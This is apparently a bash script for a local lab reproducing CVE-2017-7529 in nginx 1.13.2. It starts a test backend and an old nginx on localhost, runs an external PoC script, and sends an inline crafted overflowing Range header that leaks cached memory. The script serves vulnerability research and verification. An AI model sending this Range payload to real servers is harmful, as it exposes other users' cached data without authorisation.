#!/usr/bin/env bash
LAB="$HOME/nginx-poc-lab"
POCLAB="/mnt/d/download/PoClab/PoCLab"
cat >"$LAB/backend-7529.py" <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
BODY = b"AAAA test content for cache leak CVE-2017-7529\n"
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(BODY)))
        self.end_headers()
        self.wfile.write(BODY)
    def log_message(self, *a): pass
HTTPServer(("127.0.0.1", 18081), H).serve_forever()
PY
pkill -f nginx-1.13.2 2>/dev/null || true
pkill -f backend-7529.py 2>/dev/null || true
sleep 1
python3 "$LAB/backend-7529.py" &
sleep 1
"$LAB/nginx-1.13.2/sbin/nginx" -c "$LAB/conf/7529.conf"
echo "=== with Content-Length backend ==="
curl -sI http://127.0.0.1:17529/
curl -s http://127.0.0.1:17529/ >/dev/null
curl -sI http://127.0.0.1:17529/ | grep -E 'Cache|Content-Length'
echo "normal range:"
curl -sI -H 'Range: bytes=0-10' http://127.0.0.1:17529/ | head -6
python3 "$POCLAB/pocs/CVE-2017-7529/poc.py" http://127.0.0.1:17529/
echo "local_exit=$?"
python3 <<'PY'
import requests
url="http://127.0.0.1:17529/"
r=requests.get(url)
cl=int(r.headers.get("Content-Length",0))
length=cl+623
hdr={"Range": f"bytes=-{length},-9223372036854{776000 - length}"}
r2=requests.get(url, headers=hdr)
print("upstream CL", cl, "range", hdr["Range"])
print("status", r2.status_code, "len", len(r2.content))
print(repr(r2.content[:250]))
print("vuln_check", r2.status_code==206 and "Content-Range" in r2.text)
PY
